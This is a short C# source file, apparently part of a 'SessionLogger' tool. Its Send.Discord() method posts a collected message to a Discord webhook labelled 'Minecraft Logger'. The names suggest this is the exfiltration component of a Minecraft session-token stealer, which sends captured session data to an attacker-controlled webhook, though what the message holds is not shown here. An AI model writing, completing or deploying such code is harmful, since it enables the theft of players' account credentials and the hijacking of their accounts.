using System;
using System.Collections.Generic;
using System.Text;

namespace SessionLogger.Logger
{
    class Send
    {
        public static void Discord()
        {
            SendWebhook.sendWebHook(Get.WebhookUrl(), Get.message(), "Minecraft Logger");
        }
    }
}
